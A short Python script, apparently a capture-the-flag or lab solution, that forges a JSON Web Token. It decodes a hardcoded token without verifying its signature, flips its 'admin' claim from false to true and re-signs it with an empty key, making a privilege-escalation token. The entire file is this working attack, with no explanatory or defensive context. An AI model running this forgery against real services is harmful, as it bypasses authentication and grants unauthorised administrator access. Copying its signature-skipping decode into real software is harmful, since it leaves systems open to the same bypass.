from jwt import encode, decode


def read_token(token: str) -> dict: return decode(token, options={"verify_signature": False})
def create_token(data: dict, key: str) -> str: return encode(data, key=key)


if __name__ == '__main__':
    received_token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjMyciIsImFkbWluIjpmYWxzZX0.byuA--0yAgInrcbz97lbhWjcAzQSbx8j1j89Q2lGvWM'
    read_data = read_token(received_token)
    read_data['admin'] = True
    modified_token = create_token(read_data, '')
    print(modified_token)



